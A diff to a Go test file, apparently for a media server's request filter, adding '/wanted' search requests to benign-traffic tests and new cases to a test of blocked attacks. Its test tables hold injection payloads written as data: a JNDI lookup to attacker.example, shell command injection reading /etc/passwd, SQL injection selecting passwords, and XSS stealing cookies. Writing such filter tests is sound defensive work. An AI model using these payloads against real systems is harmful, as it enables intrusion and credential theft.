@@ -119,6 +119,9 @@ func (g cv) requests() []cvRequest {
 		cvGet(api + "/items/" + item + "/next?file=" + file),
 		cvGet(api + "/admin/organize/runs?library=" + lib),
 		cvGet(api + "/search?" + url.Values{"q": {g.title()}}.Encode()),
+		cvBody("POST", api+"/wanted/search", map[string]any{"kind": g.pick("movie", "show"), "query": g.title()}),
+		cvBody("POST", api+"/wanted/search", map[string]any{"kind": "movie", "query": g.title(), "year": 2006}),
+		cvBody("POST", api+"/wanted", map[string]any{"kind": "show", "libraryId": lib, "provider": "tmdb", "id": "12345"}),
 		cvGet(api + "/admin/browse?" + url.Values{"path": {g.pick(cvPaths...)}}.Encode()),
 		cvGet(g.asset()),
 		cvRange(api + "/stream/" + g.token() + "/t-" + g.id() + "-orig." + g.pick("flac", "mp3")),
@@ -280,6 +283,7 @@ func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
 			}
 			for _, title := range cvTitles {
 				send(cvGet("/api/v1/search?"+url.Values{"q": {title}}.Encode()), "")
+				send(cvBody("POST", "/api/v1/wanted/search", map[string]any{"kind": "movie", "query": title}), "")
 				send(cvBody("POST", "/api/v1/admin/items/"+g.id()+"/identify/search", map[string]any{"q": title, "provider": "tmdb"}), "")
 				send(cvBody("POST", "/api/v1/admin/music/albums/"+g.id()+"/identify/search", map[string]any{"album": title, "artist": title}), "")
 				send(cvBody("PUT", "/api/v1/music/queue", map[string]any{"clientId": g.clientID(), "device": "iPad", "queue": map[string]any{
@@ -369,6 +373,8 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvBody("PUT", api+"/music/queue", map[string]any{"device": "${jndi:ldap://attacker.example/a}", "queue": map[string]any{}})},
 		{1, cvBody("POST", api+"/admin/music/albums/"+item+"/identify/search", map[string]any{"album": "x", "artist": "Sam; ls -la"})},
 		{1, cvGet(api + "/search?" + url.Values{"q": {"${jndi:ldap://attacker.example/a}"}}.Encode())},
+		{1, cvBody("POST", api+"/wanted/search", map[string]any{"kind": "movie", "query": "x' UNION SELECT password FROM users--"})},
+		{1, cvBody("POST", api+"/wanted/search", map[string]any{"kind": "show", "query": "<script>alert(1)</script>"})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "<script>alert(document.cookie)</script>"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "x' UNION SELECT password FROM users--"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "done; cat /etc/passwd"}}})},
